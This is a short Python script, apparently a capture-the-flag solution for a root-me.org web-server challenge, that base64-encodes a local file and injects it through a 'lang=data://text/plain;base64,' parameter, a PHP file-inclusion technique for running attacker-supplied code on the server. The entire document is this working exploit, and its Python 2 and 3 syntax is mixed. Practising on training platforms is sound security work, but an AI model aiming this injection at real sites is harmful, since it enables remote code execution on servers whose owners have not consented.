#!/usr/bin/python3 env
import urllib2
import requests
import base64



with open("test.txt","rb") as f:
	dataout = base64.b64encode(f.read())


url = "http://challenge01.root-me.org/web-serveur/ch13/?lang=data://text/plain;base64,"+dataout

s = requests.session()
r = s.get(url)


print r.text+"\n"